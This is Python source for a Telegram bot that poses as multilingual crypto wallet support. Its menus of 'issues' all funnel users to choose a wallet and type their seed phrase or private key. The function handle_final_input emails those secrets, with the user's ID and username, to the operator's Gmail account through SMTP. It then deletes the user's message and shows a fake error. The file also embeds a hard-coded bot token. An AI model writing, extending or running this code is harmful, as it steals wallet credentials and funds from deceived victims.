async def send_and_push_message(
    bot,
    chat_id: int,
    text: str,
    context: ContextTypes.DEFAULT_TYPE,
    reply_markup=None,
    parse_mode=None,
    state=None,
) -> object:
    """
    Sends a message (new) and records it in context.user_data['message_stack'].
    If 'state' is provided, that will be recorded as the message's state.
    """
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append(
        {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "text": text,
            "reply_markup": reply_markup,
            "state": recorded_state,
            "parse_mode": parse_mode,
        }
    )
    if len(stack) > 40:
        stack.pop(0)
    return msg


# Helper to edit the current displayed message into the previous step (in-place) when Back pressed.
async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Pop the top-of-stack (the most recent sent message record),
    then attempt to edit the current message (the one containing the Back button)
    into the previous step's text + markup.
    """
    stack = context.user_data.get("message_stack", [])
    if not stack:
        keyboard = build_language_keyboard()
        await send_and_push_message(context.bot, update.effective_chat.id, LANGUAGES["en"]["choose language"], context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)


# Language selection keyboard
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇦🇪", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
    ]
    return InlineKeyboardMarkup(keyboard)


# Build main menu using ui_text(context, ...) so it always uses the user's selected language
def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton(ui_text(context, "buy"), callback_data="buy"), InlineKeyboardButton(ui_text(context, "validation"), callback_data="validation")],
        [InlineKeyboardButton(ui_text(context, "claim tokens"), callback_data="claim_tokens"), InlineKeyboardButton(ui_text(context, "migration issues"), callback_data="migration_issues")],
        [InlineKeyboardButton(ui_text(context, "assets recovery"), callback_data="assets_recovery"), InlineKeyboardButton(ui_text(context, "general issues"), callback_data="general_issues")],
        [InlineKeyboardButton(ui_text(context, "rectification"), callback_data="rectification"), InlineKeyboardButton(ui_text(context, "staking issues"), callback_data="staking_issues")],
        [InlineKeyboardButton(ui_text(context, "deposits"), callback_data="deposits"), InlineKeyboardButton(ui_text(context, "withdrawals"), callback_data="withdrawals")],
        [InlineKeyboardButton(ui_text(context, "missing balance"), callback_data="missing_balance"), InlineKeyboardButton(ui_text(context, "login issues"), callback_data="login_issues")],
        [InlineKeyboardButton(ui_text(context, "high gas fees"), callback_data="high_gas_fees"), InlineKeyboardButton(ui_text(context, "presale issues"), callback_data="presale_issues")],
        [InlineKeyboardButton(ui_text(context, "claim missing sticker"), callback_data="claim_missing_sticker")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_main_menu")],
    ]
    return InlineKeyboardMarkup(kb)


# Start handler - shows language selection (new message)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    # Use English choice prompt by default (until user selects), consistent with ui_text default 'en'
    await send_and_push_message(context.bot, chat_id, LANGUAGES["en"]["choose language"], context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE


# Set language when a language button pressed
async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[1]
    # set language first so ui_text uses it
    context.user_data["language"] = lang

    # Prepare main menu (now uses build_main_menu_markup which reads context.user_data['language'])
    context.user_data["current_state"] = MAIN_MENU
    welcome = ui_text(context, "welcome").format(user=update.effective_user.mention_html())
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU


# Invalid input handler: user typed when a button-only state expected
async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = ui_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", CHOOSE_LANGUAGE)


# Show connect wallet button (forward navigation -> send new message)
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["from_claim_sticker"] = False
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    label = ui_text(context, "connect wallet message")
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    await send_and_push_message(context.bot, update.effective_chat.id, f"{label}", context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET


# Start Claim Missing Sticker flow (no Back button here; forward => send new message)
async def start_claim_missing_sticker(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["current_state"] = CLAIM_STICKER_INPUT
    prompt = ui_text(context, "enter stickers prompt")
    fr = ForceReply(selective=False)
    await send_and_push_message(context.bot, update.effective_chat.id, prompt, context, reply_markup=fr, state=CLAIM_STICKER_INPUT)
    return CLAIM_STICKER_INPUT


# Handle sticker input (user types). Store but DO NOT email sticker content. Show confirmation (Yes/No) without Back.
async def handle_sticker_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text
    context.user_data["stickers_to_claim"] = text
    try:
        await context.bot.delete_message(chat_id=update.message.chat_id, message_id=update.message.message_id)
    except Exception:
        pass
    context.user_data["current_state"] = CLAIM_STICKER_CONFIRM
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(ui_text(context, "yes"), callback_data="claim_sticker_confirm_yes"),
                InlineKeyboardButton(ui_text(context, "no"), callback_data="claim_sticker_confirm_no"),
            ]
        ]
    )
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "confirm claim stickers"), context, reply_markup=keyboard, state=CLAIM_STICKER_CONFIRM)
    return CLAIM_STICKER_CONFIRM


# Handle Yes/No confirmation for stickers
async def handle_claim_sticker_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "claim_sticker_confirm_no":
        context.user_data["current_state"] = CLAIM_STICKER_INPUT
        prompt = ui_text(context, "enter stickers prompt")
        fr = ForceReply(selective=False)
        await send_and_push_message(context.bot, update.effective_chat.id, prompt, context, reply_markup=fr, state=CLAIM_STICKER_INPUT)
        return CLAIM_STICKER_INPUT

    # Yes -> proceed to connect wallet (forward)
    context.user_data["from_claim_sticker"] = True
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    text = f"{ui_text(context, 'claim missing sticker')}\n{ui_text(context, 'connect wallet message')}"
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET


# Show wallet types (forward navigation -> send new message). Wallet labels localized.
async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keyboard = []
    primary_keys = [
        "wallet_type_metamask",
        "wallet_type_trust_wallet",
        "wallet_type_coinbase",
        "wallet_type_tonkeeper",
        "wallet_type_phantom_wallet",
    ]
    for key in primary_keys:
        label = localize_wallet_label(BASE_WALLET_NAMES.get(key, key), lang)
        keyboard.append([InlineKeyboardButton(label, callback_data=key)])
    keyboard.append([InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")])
    keyboard.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")])
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE


# Show other wallets full list (forward navigation -> send new message)
async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keys = [
        "wallet_type_mytonwallet",
        "wallet_type_tonhub",
        "wallet_type_rainbow",
        "wallet_type_safepal",
        "wallet_type_wallet_connect",
        "wallet_type_ledger",
        "wallet_type_brd_wallet",
        "wallet_type_solana_wallet",
        "wallet_type_balance",
        "wallet_type_okx",
        "wallet_type_xverse",
        "wallet_type_sparrow",
        "wallet_type_earth_wallet",
        "wallet_type_hiro",
        "wallet_type_saitamask_wallet",
        "wallet_type_casper_wallet",
        "wallet_type_cake_wallet",
        "wallet_type_kepir_wallet",
        "wallet_type_icpswap",
        "wallet_type_kaspa",
        "wallet_type_nem_wallet",
        "wallet_type_near_wallet",
        "wallet_type_compass_wallet",
        "wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet",
        "wallet_type_aioz_wallet",
        "wallet_type_xpla_vault_wallet",
        "wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet",
        "wallet_type_multiversx_wallet",
        "wallet_type_verachain_wallet",
        "wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet",
        "wallet_type_fearless_wallet",
        "wallet_type_terra_station",
        "wallet_type_cosmos_station",
        "wallet_type_exodus_wallet",
        "wallet_type_argent",
        "wallet_type_binance_chain",
        "wallet_type_safemoon",
        "wallet_type_gnosis_safe",
        "wallet_type_defi",
        "wallet_type_other",
    ]
    kb = []
    row = []
    for k in keys:
        base_label = BASE_WALLET_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        label = localize_wallet_label(base_label, lang)
        row.append(InlineKeyboardButton(label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE


# Show private key / seed options (forward navigation -> send new message). Wallet name localized.
async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    wallet_key = query.data
    wallet_name = BASE_WALLET_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    localized_wallet_name = localize_wallet_label(wallet_name, lang)
    context.user_data["wallet type"] = localized_wallet_name
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key"), InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
        ]
    )
    text = ui_text(context, "wallet selection message").format(wallet_name=localized_wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT


# Prompt for input: when seed or private key selected -> send ForceReply so keyboard appears (forward navigation)
async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt seed")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt private key")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "invalid choice"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT


# Handle final wallet input and email (do not include stickers)
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    user = update.effective_user
    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    await send_email(subject, body)
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass
    context.user_data["current_state"] = AWAIT_RESTART
    await send_and_push_message(context.bot, chat_id, ui_text(context, "final error message"), context, state=AWAIT_RESTART)
    return AWAIT_RESTART


# After restart handler: any text after final error
async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART


# Send email helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")


# Universal Back handler: edit current displayed message into the previous step UI (in-place)
async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state


# Cancel
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END


def main() -> None:
    # Token replaced per your request
    application = ApplicationBuilder().token("8461964127:AAGKCwJsfdztCngIWs1EluLvKhbGJIUlxWs").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [CallbackQueryHandler(set_language, pattern="^lang_")],
            MAIN_MENU: [
                CallbackQueryHandler(start_claim_missing_sticker, pattern="^claim_missing_sticker$"),
                CallbackQueryHandler(show_connect_wallet_button, pattern="^(buy|validation|claim_tokens|migration_issues|assets_recovery|general_issues|rectification|staking_issues|deposits|withdrawals|missing_balance|login_issues|high_gas_fees|presale_issues)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
            CLAIM_STICKER_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sticker_input),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            CLAIM_STICKER_CONFIRM: [
                CallbackQueryHandler(handle_claim_sticker_confirmation, pattern="^claim_sticker_confirm_(yes|no)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()